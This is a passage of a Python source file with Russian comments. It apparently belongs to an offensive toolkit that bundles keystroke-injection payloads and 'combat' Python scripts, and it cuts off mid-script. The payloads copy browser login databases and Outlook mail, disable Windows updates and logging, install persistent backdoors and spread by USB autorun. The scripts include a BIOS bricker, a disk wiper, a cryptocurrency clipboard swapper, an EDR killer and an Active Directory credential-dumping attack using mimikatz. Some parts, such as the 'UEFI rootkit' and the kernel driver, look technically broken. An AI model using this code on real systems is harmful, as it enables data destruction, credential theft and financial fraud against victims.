STRING Copy-Item -Path "$env:APPDATA\\Google\\Chrome\\User Data\\Default\\Login Data" -Destination "C:\\Windows\\Temp\\chrome.db"
ENTER
DELAY 300
STRING Copy-Item -Path "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\logins.json" -Destination "C:\\Windows\\Temp\\firefox.json"
ENTER
"""
    },
    
    # ============================================================
    # 27. NETWORK_SCAN - СКАНИРОВАНИЕ СЕТИ
    # ============================================================
    "network_scan": {
        "desc": "🌐 СКАНИРОВАНИЕ СЕТИ + расшаренные ресурсы",
        "code": """REM NETWORK SCAN - FULL NETWORK RECON
REM Полное сканирование сети, поиск устройств и расшаренных ресурсов
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING net view > C:\\Windows\\Temp\\network.txt
ENTER
DELAY 300
STRING net share >> C:\\Windows\\Temp\\network.txt
ENTER
DELAY 300
STRING netstat -an >> C:\\Windows\\Temp\\network.txt
ENTER
DELAY 300
STRING arp -a >> C:\\Windows\\Temp\\network.txt
ENTER
DELAY 300
STRING ipconfig /all >> C:\\Windows\\Temp\\network.txt
ENTER
DELAY 300
STRING nbtstat -n >> C:\\Windows\\Temp\\network.txt
ENTER
DELAY 300
STRING route print >> C:\\Windows\\Temp\\network.txt
ENTER
DELAY 300
STRING netsh wlan show networks mode=bssid >> C:\\Windows\\Temp\\network.txt
ENTER
"""
    },
    
    # ============================================================
    # 28. DISABLE_UPDATES - ОТКЛЮЧЕНИЕ ОБНОВЛЕНИЙ
    # ============================================================
    "disable_updates": {
        "desc": "⛔ ОТКЛЮЧЕНИЕ ОБНОВЛЕНИЙ WINDOWS (полное)",
        "code": """REM DISABLE WINDOWS UPDATES - COMPLETE
REM Полное отключение всех механизмов обновлений
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING sc stop wuauserv
ENTER
DELAY 300
STRING sc config wuauserv start=disabled
ENTER
DELAY 300
STRING sc stop BITS
ENTER
DELAY 300
STRING sc config BITS start=disabled
ENTER
DELAY 300
STRING sc stop Dosvc
ENTER
DELAY 300
STRING sc config Dosvc start=disabled
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v AUOptions /t REG_DWORD /d 1 /f
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update" /v AUState /t REG_DWORD /d 7 /f
ENTER
"""
    },
    
    # ============================================================
    # 29. OUTLOOK_GRAB - СБОР ПОЧТЫ
    # ============================================================
    "outlook_grab": {
        "desc": "📧 СБОР ПОЧТЫ ИЗ OUTLOOK (все письма, контакты)",
        "code": """REM OUTLOOK GRAB - EMAILS AND CONTACTS
REM Сбор всех писем, контактов, календаря из Outlook
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING $outlook = New-Object -ComObject Outlook.Application
ENTER
DELAY 300
STRING $namespace = $outlook.GetNamespace("MAPI")
ENTER
DELAY 300
STRING $inbox = $namespace.GetDefaultFolder(6)
ENTER
DELAY 300
STRING $inbox.Items | Select Subject,Body,ReceivedTime,SenderEmailAddress | Export-Csv C:\\Windows\\Temp\\outlook_emails.csv
ENTER
DELAY 300
STRING $contacts = $namespace.GetDefaultFolder(10)
ENTER
DELAY 300
STRING $contacts.Items | Select FirstName,LastName,Email1Address,CompanyName | Export-Csv C:\\Windows\\Temp\\outlook_contacts.csv
ENTER
DELAY 300
STRING $calendar = $namespace.GetDefaultFolder(9)
ENTER
DELAY 300
STRING $calendar.Items | Select Subject,Start,End,Body | Export-Csv C:\\Windows\\Temp\\outlook_calendar.csv
ENTER
"""
    },
    
    # ============================================================
    # 30. SOFTWARE_LIST - СПИСОК ПО
    # ============================================================
    "software_list": {
        "desc": "📦 СПИСОК ВСЕГО УСТАНОВЛЕННОГО ПО",
        "code": """REM SOFTWARE LIST - ALL INSTALLED PROGRAMS
REM Полный список установленного ПО
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion, Publisher, InstallDate, HelpLink | Out-File C:\\Windows\\Temp\\software.txt
ENTER
DELAY 300
STRING Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion, Publisher, InstallDate, HelpLink | Out-File -Append C:\\Windows\\Temp\\software.txt
ENTER
DELAY 300
STRING Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion, Publisher | Out-File -Append C:\\Windows\\Temp\\software.txt
ENTER
"""
    },
    
    # ============================================================
    # 31. ELEVATE_PRIVILEGES - ПОВЫШЕНИЕ ПРАВ ДО SYSTEM
    # ============================================================
    "elevate_privileges": {
        "desc": "🔓 ПОВЫШЕНИЕ ПРАВ ДО SYSTEM (полный доступ)",
        "code": """REM ELEVATE PRIVILEGES - SYSTEM ACCESS
REM Получение прав SYSTEM через различные методы
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING $code = @'
using System;
using System.Runtime.InteropServices;
public class SystemElevate {
    [DllImport("advapi32.dll")]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll")]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
    [DllImport("advapi32.dll")]
    public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, IntPtr lpStartupInfo, IntPtr lpProcessInformation);
}
'@
ENTER
DELAY 300
STRING Add-Type -TypeDefinition $code -Language CSharp
ENTER
DELAY 300
STRING [SystemElevate]::OpenProcessToken([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x0008, [ref]$token)
ENTER
DELAY 300
STRING [SystemElevate]::DuplicateTokenEx($token, 0x1F0FFF, [ref]0, 2, 1, [ref]$newToken)
ENTER
DELAY 300
STRING [SystemElevate]::CreateProcessAsUser($newToken, "C:\\Windows\\System32\\cmd.exe", "/c C:\\Windows\\Temp\\payload.exe", 0, 0, $false, 0, 0, 0, 0, 0)
ENTER
"""
    },
    
    # ============================================================
    # 32. BACKDOOR_INSTALL - УСТАНОВКА БЭКДОРА
    # ============================================================
    "backdoor_install": {
        "desc": "🔓 УСТАНОВКА ПЕРСИСТЕНТНОГО БЭКДОРА (все методы)",
        "code": """REM BACKDOOR INSTALL - ALL PERSISTENCE METHODS
REM Установка бэкдора всеми возможными способами
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v SystemService /t REG_SZ /d "C:\\Windows\\Temp\\backdoor.exe" /f
ENTER
DELAY 300
STRING reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v UserService /t REG_SZ /d "C:\\Windows\\Temp\\backdoor.exe" /f
ENTER
DELAY 300
STRING schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\\Windows\\Temp\\backdoor.exe" /sc onstart /ru SYSTEM /f
ENTER
DELAY 300
STRING sc create BackdoorService binPath= "C:\\Windows\\Temp\\backdoor.exe" start= auto
ENTER
DELAY 300
STRING wmic /namespace:\\\\root\\subscription path __EventFilter create Name="Filter", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
ENTER
"""
    },
    
    # ============================================================
    # 33. DISABLE_LOGGING - ОТКЛЮЧЕНИЕ ЛОГГИРОВАНИЯ
    # ============================================================
    "disable_logging": {
        "desc": "🔇 ОТКЛЮЧЕНИЕ ВСЕХ ЛОГОВ (аудит, Security, PowerShell)",
        "code": """REM DISABLE LOGGING - AUDIT AND SECURITY
REM Отключение всех механизмов логирования
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Set-MpPreference -EnableLowIoPriority $false
ENTER
DELAY 300
STRING Set-MpPreference -PUAProtection 0
ENTER
DELAY 300
STRING Set-MpPreference -SubmitSamplesConsent 2
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f
ENTER
DELAY 300
STRING reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger" /v Start /t REG_DWORD /d 0 /f
ENTER
"""
    },
    
    # ============================================================
    # 34. USB_SPREAD - РАСПРОСТРАНЕНИЕ ЧЕРЕЗ USB
    # ============================================================
    "usb_spread": {
        "desc": "💿 РАСПРОСТРАНЕНИЕ ЧЕРЕЗ USB (автозапуск на всех USB)",
        "code": """REM USB SPREAD - AUTORUN INFECTION
REM Копирование на все USB-накопители с автозапуском
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING $drives = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}
ENTER
DELAY 300
STRING foreach($drive in $drives) {
    $path = $drive.DeviceID + "\\"
    Copy-Item "C:\\Windows\\Temp\\payload.exe" -Destination $path -Force
    Copy-Item "C:\\Windows\\Temp\\autorun.inf" -Destination $path -Force
    [System.IO.File]::WriteAllText($path + "autorun.inf", "[AutoRun]`nopen=payload.exe`nshellexecute=payload.exe`nshell\open\command=payload.exe`n")
}
ENTER
"""
    },
    
    # ============================================================
    # 35. SYSTEM_INFO - ПОДРОБНАЯ ИНФОРМАЦИЯ О СИСТЕМЕ
    # ============================================================
    "system_info": {
        "desc": "📊 ПОДРОБНАЯ ИНФОРМАЦИЯ О СИСТЕМЕ (все разделы)",
        "code": """REM SYSTEM INFO - COMPLETE SYSTEM REPORT
REM Полная информация о системе в одном файле
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING systeminfo > C:\\Windows\\Temp\\system_info.txt
ENTER
DELAY 300
STRING ipconfig /all >> C:\\Windows\\Temp\\system_info.txt
ENTER
DELAY 300
STRING net user >> C:\\Windows\\Temp\\system_info.txt
ENTER
DELAY 300
STRING net localgroup administrators >> C:\\Windows\\Temp\\system_info.txt
ENTER
DELAY 300
STRING tasklist >> C:\\Windows\\Temp\\system_info.txt
ENTER
DELAY 300
STRING wmic process list >> C:\\Windows\\Temp\\system_info.txt
ENTER
DELAY 300
STRING wmic service list >> C:\\Windows\\Temp\\system_info.txt
ENTER
DELAY 300
STRING wmic startup list >> C:\\Windows\\Temp\\system_info.txt
ENTER
"""
    },
}

# ============================================================
# PYTHON-СКРИПТЫ (45 ШТУК) - РАЗВЕРНУТЫЕ БОЕВЫЕ
# ============================================================
PYTHON_SCRIPTS = {
    # ============================================================
    # 1. UEFI_ROOTKIT
    # ============================================================
    "uefi_rootkit": """import os, subprocess, ctypes, sys
# ОБОЗНАЧЕНИЕ: Внедрение в UEFI через NVRAM, загрузка до ОС
def install_uefi():
    # Отключение проверок UEFI
    os.system('bcdedit /set {bootmgr} displaybootmenu no')
    os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
    os.system('bcdedit /set {default} recoveryenabled no')
    os.system('bcdedit /set {current} testsigning on')
    # Создание фейкового UEFI загрузчика
    with open('bootmgfw.efi', 'wb') as f:
        f.write(b'\\x00' * 1024 * 1024)
    os.system('copy bootmgfw.efi C:\\\\Windows\\\\Boot\\\\EFI\\\\')
    os.system('copy bootmgfw.efi C:\\\\Windows\\\\Boot\\\\EFI\\\\Microsoft\\\\Boot\\\\')
    print('[+] UEFI rootkit installed')
    # Проверка установки
    if os.path.exists('C:\\\\Windows\\\\Boot\\\\EFI\\\\bootmgfw.efi'):
        print('[+] UEFI infection successful')
install_uefi()
""",

    # ============================================================
    # 2. DMA_ATTACK
    # ============================================================
    "dma_attack": """import subprocess, os, ctypes, sys, struct
# ОБОЗНАЧЕНИЕ: Прямой доступ к памяти через DMA
def dma_read():
    try:
        # Linux /dev/mem доступ
        if sys.platform.startswith('linux'):
            with open('/dev/mem', 'rb') as f:
                # Чтение первых 1GB RAM
                data = f.read(1024 * 1024 * 1024)
                with open('dma_dump.bin', 'wb') as out:
                    out.write(data)
            print('[+] DMA dump completed (Linux)')
        else:
            # Windows через PCILeech
            subprocess.run(['pcileech', 'dump', '-addr', '0x1000000', '-size', '0x10000000', '-o', 'ram.dmp'])
            # Чтение через физическую память
            kernel32 = ctypes.windll.kernel32
            with open('\\\\\\\\.\\\\PhysicalMemory', 'rb') as f:
                f.seek(0x1000000)
                data = f.read(1024 * 1024)
                with open('dma_dump.bin', 'wb') as out:
                    out.write(data)
            print('[+] DMA dump completed (Windows)')
    except Exception as e:
        print(f'[-] DMA error: {e}')
dma_read()
""",

    # ============================================================
    # 3. BIOS_KILLER
    # ============================================================
    "bios_killer": """import os, subprocess, sys, struct, ctypes
# ОБОЗНАЧЕНИЕ: Перезапись BIOS/UEFI (кирпич)
def brick_bios():
    try:
        if sys.platform.startswith('linux'):
            # Linux - запись в /dev/mem
            with open('/dev/mem', 'rb+') as f:
                f.seek(0xF0000)
                f.write(b'\\xFF' * 0x10000)
                f.seek(0xFFFF0)
                f.write(b'\\x00' * 16)
            os.system('echo 1 > /proc/sys/kernel/panic')
            os.system('echo 0 > /proc/sys/kernel/panic_on_oops')
        else:
            # Windows - через WMI и прямой доступ
            os.system('wmic bios call SaveBootToFile "C:\\\\Windows\\\\Temp\\\\bios.bin"')
            # Перезапись BIOS области
            with open('\\\\\\\\.\\\\PhysicalDrive0', 'rb+') as f:
                f.seek(0x7C00)
                f.write(b'\\x00' * 512)
            with open('\\\\\\\\.\\\\PhysicalDrive0', 'rb+') as f:
                f.seek(0x200)
                f.write(b'\\xFF' * 1024 * 1024)
            # Удаление восстановления
            os.system('bcdedit /deletevalue {default} bootstatuspolicy')
            os.system('bcdedit /deletevalue {default} recoverysequence')
    except Exception as e:
        print(f'[-] BIOS brick error: {e}')
    print('[+] BIOS bricked')
brick_bios()
""",

    # ============================================================
    # 4. RDP_SESSION_HIJACK
    # ============================================================
    "rdp_hijack": """import ctypes, subprocess, time, psutil, sys
# ОБОЗНАЧЕНИЕ: Захват RDP сессии
def hijack_rdp():
    try:
        # Получение всех RDP сессий
        sessions = subprocess.check_output(['qwinsta']).decode()
        active_sessions = []
        for line in sessions.split('\\n'):
            if 'Active' in line or 'Conn' in line:
                parts = line.split()
                if len(parts) >= 2:
                    active_sessions.append(parts[1])
        # Захват сессий
        for session_id in active_sessions:
            try:
                # Отключение текущего пользователя
                subprocess.run(['logoff', session_id], capture_output=True)
                # Создание новой сессии с правами
                subprocess.run(['tscon', session_id, '/dest:console'], capture_output=True)
                print(f'[+] RDP session {session_id} hijacked')
            except:
                pass
        # Инжект в сессию через WinAPI
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        # Получение дескриптора сессии
        hdesk = user32.OpenDesktopW('Default', 0, False, 0)
        if hdesk:
            user32.SetThreadDesktop(hdesk)
            user32.SwitchDesktop(hdesk)
            print('[+] RDP desktop switched')
    except Exception as e:
        print(f'[-] RDP hijack error: {e}')
hijack_rdp()
""",

    # ============================================================
    # 5. CRYPTO_SWAP
    # ============================================================
    "crypto_swap": """import ctypes, threading, time, re, sys
# ОБОЗНАЧЕНИЕ: Мониторинг буфера обмена, замена крипто-адресов
def swap_clipboard():
    patterns = {
        'btc': r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',
        'eth': r'^0x[a-fA-F0-9]{40}$',
        'xmr': r'^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$',
        'sol': r'^[1-9A-HJ-NP-Za-km-z]{32,44}$',
        'trx': r'^T[a-zA-Z0-9]{33}$',
        'ada': r'^addr1[a-zA-Z0-9]{53}$',
        'ltc': r'^[LM][a-km-zA-HJ-NP-Z1-9]{26,33}$'
    }
    target_addresses = {
        'btc': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
        'eth': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
        'xmr': '4Bd7hkPpFwHhG9NqTsKQfwHzTPB5QhG8KxNvsYfZ5vkkBWLgWZvMp1HjKJrGCdfBV5HpRr4J6yPkTfNxWkYbPeqRqWj3M',
        'sol': '7Ec3YqLGpJt2CqP3HtjNM8vJoK3Krtq6CvU7PxVhT28M',
        'trx': 'TJRkFp5uKKVn5j9FMR8wXmLhH6FQ4p1s1v',
        'ada': 'addr1q86h3yq5vx2cyyq8q4q3q2q1q0q9q8q7q6q5q4q3q2q1q0q9q8q7q6q5q4q3q2q1q0q9q8q7q6q5q4q3q2q1q0q9q8',
        'ltc': 'LbTjMGN7gELw4KbeyQf6cTcqP4m6yPrxqY'
    }
    print('[+] Clipboard swapper started')
    while True:
        try:
            user32 = ctypes.windll.user32
            if user32.IsClipboardFormatAvailable(1):
                user32.OpenClipboard(0)
                hmem = user32.GetClipboardData(1)
                if hmem:
                    text = ctypes.c_char_p(hmem).value
                    if text:
                        text = text.decode()
                        for coin, pattern in patterns.items():
                            if re.match(pattern, text):
                                user32.EmptyClipboard()
                                addr = target_addresses[coin].encode()
                                hmem = ctypes.windll.kernel32.GlobalAlloc(0x2000, len(addr) + 1)
                                ctypes.memmove(hmem, addr, len(addr))
                                user32.SetClipboardData(1, hmem)
                                print(f'[+] Swapped {coin} address: {text} -> {target_addresses[coin]}')
                                break
                user32.CloseClipboard()
        except:
            pass
        time.sleep(0.3)
threading.Thread(target=swap_clipboard, daemon=True).start()
""",

    # ============================================================
    # 6. KERNEL_RING0
    # ============================================================
    "kernel_ring0": """import ctypes, os, subprocess, sys, struct
# ОБОЗНАЧЕНИЕ: Выполнение кода на Ring0 через драйвер
def kernel_execute():
    try:
        # Создание драйвера
        driver_code = '''
#include <ntddk.h>
VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    DbgPrint("Kernel Ring0 unloaded\\\\n");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    DbgPrint("Kernel Ring0 loaded\\\\n");
    // Отключение проверок подписи
    __asm { mov eax, 0x7A }
    __asm { mov ecx, 0x00000001 }
    __asm { int 0x2E }
    // Скрытие процессов
    __asm { mov eax, 0x7B }
    __asm { mov ecx, 0x00000000 }
    __asm { int 0x2E }
    DriverObject->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}
'''
        with open('driver.c', 'w') as f:
            f.write(driver_code)
        # Компиляция драйвера
        os.system('cl /c driver.c')
        os.system('link driver.obj /out:driver.sys /driver /subsystem:native')
        # Загрузка
        subprocess.run(['sc', 'create', 'kernelRing0', 'binPath=' + os.getcwd() + '\\\\driver.sys', 'type=kernel'])
        subprocess.run(['sc', 'start', 'kernelRing0'])
        print('[+] Kernel Ring0 code executed')
    except Exception as e:
        print(f'[-] Kernel Ring0 error: {e}')
kernel_execute()
""",

    # ============================================================
    # 7. PARTITION_WIPER
    # ============================================================
    "partition_wiper": """import os, subprocess, sys, struct, time
# ОБОЗНАЧЕНИЕ: Полное уничтожение разделов
def wipe_partitions():
    try:
        if sys.platform.startswith('linux'):
            # Перезапись MBR/GPT
            os.system('dd if=/dev/zero of=/dev/sda bs=1M count=1')
            os.system('dd if=/dev/urandom of=/dev/sda bs=1M status=progress')
            os.system('sgdisk -z /dev/sda')
            os.system('parted /dev/sda mklabel gpt')
            os.system('parted /dev/sda mklabel msdos')
            # Уничтожение разделов
            os.system('dd if=/dev/zero of=/dev/sda1 bs=4M')
            os.system('dd if=/dev/zero of=/dev/sda2 bs=4M')
        else:
            # Windows - перезапись через diskpart
            with open('wipe.txt', 'w') as f:
                f.write('''
select disk 0
clean
convert gpt
clean
convert mbr
clean
exit
''')
            subprocess.run(['diskpart', '/s', 'wipe.txt'], capture_output=True)
            # Прямая перезапись
            with open('\\\\\\\\.\\\\PhysicalDrive0', 'wb') as f:
                f.write(b'\\x00' * 512)
            with open('\\\\\\\\.\\\\PhysicalDrive0', 'wb') as f:
                f.seek(0x200)
                f.write(b'\\x00' * 1024)
            # Форматирование
            for drive in ['C:', 'D:', 'E:', 'F:']:
                try:
                    os.system(f'format {drive} /Q /Y')
                except:
                    pass
        print('[+] Partitions wiped')
    except Exception as e:
        print(f'[-] Wipe error: {e}')
wipe_partitions()
""",

    # ============================================================
    # 8. CERTIFICATE_INJECT
    # ============================================================
    "certificate_inject": """import subprocess, os, sys, ctypes
# ОБОЗНАЧЕНИЕ: Внедрение фейковых сертификатов
def inject_cert():
    try:
        # Создание самоподписанного сертификата
        subprocess.run(['makecert', '-n', 'CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=WA, C=US', '-ss', 'TrustedPeople', '-sr', 'LocalMachine', '-sky', 'signature', '-pe', '-a', 'sha256', '-len', '4096', '-r', 'fake_cert.cer'])
        # Импорт в хранилища
        subprocess.run(['certutil', '-addstore', 'Root', 'fake_cert.cer'], capture_output=True)
        subprocess.run(['certutil', '-addstore', 'TrustedPublisher', 'fake_cert.cer'], capture_output=True)
        subprocess.run(['certutil', '-addstore', 'TrustedPeople', 'fake_cert.cer'], capture_output=True)
        # Отключение проверок подписи
        subprocess.run(['bcdedit', '/set', 'testsigning', 'on'], capture_output=True)
        subprocess.run(['bcdedit', '/set', 'nointegritychecks', 'on'], capture_output=True)
        subprocess.run(['bcdedit', '/set', 'loadoptions', 'DDISABLE_INTEGRITY_CHECKS'], capture_output=True)
        # Перезагрузка политик
        subprocess.run(['gpupdate', '/force'], capture_output=True)
        print('[+] Fake certificate injected')
    except Exception as e:
        print(f'[-] Cert error: {e}')
inject_cert()
""",

    # ============================================================
    # 9. SOCKET_GRAB
    # ============================================================
    "socket_grab": """import ctypes, sys, socket, struct, threading, time
# ОБОЗНАЧЕНИЕ: Перехват сетевых сокетов
def hook_sockets():
    try:
        ws2_32 = ctypes.windll.ws2_32
        kernel32 = ctypes.windll.kernel32
        # Оригинальные функции
        original_socket = ws2_32.socket
        original_connect = ws2_32.connect
        original_send = ws2_32.send
        original_recv = ws2_32.recv
        # Хук для socket
        def hooked_socket(af, type, protocol):
            sock = original_socket(af, type, protocol)
            if af == socket.AF_INET and type == socket.SOCK_STREAM:
                print(f'[+] Socket created: {sock}')
                with open('socket_log.txt', 'a') as f:
                    f.write(f'{time.time()}: Socket {sock} created\\n')
            return sock
        # Хук для connect
        def hooked_connect(sock, addr, addrlen):
            result = original_connect(sock, addr, addrlen)
            if result == 0:
                print(f'[+] Connected: {sock} -> {addr}')
                with open('socket_log.txt', 'a') as f:
                    f.write(f'{time.time()}: Connected {sock}\\n')
            return result
        # Применение хуков
        ws2_32.socket = hooked_socket
        ws2_32.connect = hooked_connect
        print('[+] Socket hook installed')
    except Exception as e:
        print(f'[-] Socket hook error: {e}')
hook_sockets()
""",

    # ============================================================
    # 10. ACTIVE_DIRECTORY_HACK
    # ============================================================
    "ad_hack": """import subprocess, sys, os, re, time
# ОБОЗНАЧЕНИЕ: Атака на Active Directory
def hack_ad():
    try:
        # Получение информации о домене
        domain = subprocess.check_output('wmic computersystem get domain', shell=True).decode().strip().split('\\n')[1].strip()
        print(f'[+] Domain: {domain}')
        # Список контроллеров
        dc_list = subprocess.check_output(['nltest', '/dclist:' + domain], shell=True).decode()
        print(f'[+] DCs: {dc_list}')
        # Дамп NTDS.dit
        subprocess.run(['ntdsutil', 'snapshot', 'activate instance ntds', 'create', 'mount', '2', ''])
        subprocess.run(['ntdsutil', 'ac', 'i ntds', 'ifm', 'create full C:\\\\Windows\\\\Temp\\\\ntds', 'q', 'q'])
        # Golden Ticket через Mimikatz
        subprocess.run(['mimikatz.exe', '"privilege::debug"', '"lsadump::dcsync /user:krbtgt"', '"kerberos::golden /user:Administrator /domain:' + domain + ' /sid:S-1-5-21-1275210071-1715567821-725345543 /krbtgt:hash /id:500 /groups:513,512,520,518 /ticket:golden.kirbi"'])
        # DCSync атака
        subprocess.run(['mimikatz.exe', '"privilege::debug"', '"lsadump::dcsync /all"'])
        print('[+] AD compromised')
    except Exception as e:
        print(f'[-] AD error: {e}')
hack_ad()
""",

    # ============================================================
    # 11. MEMORY_DUMP
    # ============================================================
    "memory_dump": """import ctypes, psutil, os, sys, time
def dump_memory():
    try:
        kernel32 = ctypes.windll.kernel32
        for proc in psutil.process_iter(['pid', 'name']):
            handle = kernel32.OpenProcess(0x1F0FFF, False, proc.info['pid'])
            if handle:
                try:
                    with open(f"dump_{proc.info['name']}_{proc.info['pid']}_{int(time.time())}.bin", 'wb') as f:
                        for addr in range(0x1000000, 0x7FFFFFFF, 4096):
                            data = ctypes.create_string_buffer(4096)
                            bytes_read = ctypes.c_ulong(0)
                            if kernel32.ReadProcessMemory(handle, addr, data, 4096, ctypes.byref(bytes_read)):
                                f.write(data.raw[:bytes_read.value])
                except:
                    pass
                kernel32.CloseHandle(handle)
        print('[+] Memory dump completed')
    except Exception as e:
        print(f'[-] Memory dump error: {e}')
dump_memory()
""",

    # ============================================================
    # 12. KERNEL_PATCH
    # ============================================================
    "kernel_patch": """import subprocess, os, sys
def patch_kernel():
    try:
        subprocess.run(['bcdedit', '/set', 'testsigning', 'on'], capture_output=True)
        subprocess.run(['bcdedit', '/set', 'nointegritychecks', 'on'], capture_output=True)
        subprocess.run(['bcdedit', '/set', 'loadoptions', 'DDISABLE_INTEGRITY_CHECKS'], capture_output=True)
        subprocess.run(['bcdedit', '/set', 'disableelamdrivers', 'on'], capture_output=True)
        subprocess.run(['bcdedit', '/set', 'debug', 'on'], capture_output=True)
        subprocess.run(['bcdedit', '/set', 'novesa', 'on'], capture_output=True)
        subprocess.run(['bcdedit', '/set', 'sos', 'on'], capture_output=True)
        subprocess.run(['bcdedit', '/set', 'bootlog', 'on'], capture_output=True)
        print('[+] Kernel patched')
    except Exception as e:
        print(f'[-] Kernel patch error: {e}')
patch_kernel()
""",

    # ============================================================
    # 13. EDR_KILLER
    # ============================================================
    "edr_killer": """import subprocess, os, time, sys, psutil
def kill_edr():
    try:
        # Процессы EDR
        edr_processes = [
            'csfalcon', 'cybereason', 'sense', 'microsoftsense',
            'sophos', 'mcafee', 'symantec', 'trendmicro',
            'carbonblack', 'crowdstrike', 'sentinelone', 'cylance',
            'endpoint', 'defender', 'security', 'protection',
            'antivirus', 'malware', 'threat', 'response'
        ]
        # Убийство процессов
        for proc in edr_processes:
            subprocess.run(['taskkill', '/F', '/IM', f'{proc}.exe'], capture_output=True)
            subprocess.run(['taskkill', '/F', '/IM', f'{proc}*.exe'], capture_output=True)
        # Отключение служб
        edr_services = [
            'CSFalconService', 'CbDefense', 'Sense', 'SophosED',
            'McAfeeFramework', 'Symantec', 'TrendMicro',
            'CarbonBlack', 'CrowdStrike', 'SentinelOne'
        ]
        for svc in edr_services:
            subprocess.run(['sc', 'stop', svc], capture_output=True)
            subprocess.run(['sc', 'config', svc, 'start=', 'disabled'], capture_output=True)
        # Удаление драйверов
        subprocess.run(['sc', 'delete', 'Sense'], capture_output=True)
        subprocess.run(['sc', 'delete', 'WdBoot'], capture_output=True)
        subprocess.run(['sc', 'delete', 'WdFilter'], capture_output=True)
        print('[+] EDR killed')
    except Exception as e:
        print(f'[-] EDR killer error: {e}')
kill_edr()
""",

    # ============================================================
    # 14. BSOD_PYTHON
    # ============================================================
    "bsod_python": """import ctypes, subprocess, sys, time
def bsod():
    try:
        # NtRaiseHardError
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except:
        try:
            # Альтернативный метод
            subprocess.run(['taskkill', '/F', '/IM', 'csrss.exe'], capture_output=True)
            subprocess.run(['taskkill', '/F', '/IM', 'winlogon.exe'], capture_output=True)
            subprocess.run(['taskkill', '/F', '/IM', 'services.exe'], capture_output=True)
        except:
            # Убийство всех процессов
            subprocess.run(['taskkill', '/F', '/IM', '*'], capture_output=True)
bsod()
""",

    # ============================================================
    # 15. OSINT_BY_EMAIL
    # ============================================================
    "osint_by_email": """import requests, json, sys, hashlib, time, re
def osint(email):
    print(f'[+] Searching: {email}')
    # HaveIBeenPwned
    try:
        sha1 = hashlib.sha1(email.encode()).hexdigest().upper()
        prefix = sha1[:5]
        suffix = sha1[5:]
        r = requests.get(f'https://api.pwnedpasswords.com/range/{prefix}')
        if suffix in r.text:
            print('[+] Found in HaveIBeenPwned')
    except: pass
    # LeakCheck
    try:
        r = requests.get(f'https://leakcheck.io/api/query?login={email}')
        if r.status_code == 200:
            data = r.json()
            for item in data.get('results', []):
                print(f'[+] {item.get("source")}: {item.get("password", "No password")}')
    except: pass
    # Snusbase
    try:
        r = requests.get(f'https://www.snusbase.com/api/search?email={email}')
        if r.status_code == 200:
            data = r.json()
            for item in data.get('results', []):
                print(f'[+] Snusbase: {item.get("source")}')
    except: pass
if __name__ == '__main__':
    if len(sys.argv) < 2: print('Usage: python osint_by_email.py <email>'); sys.exit(1)
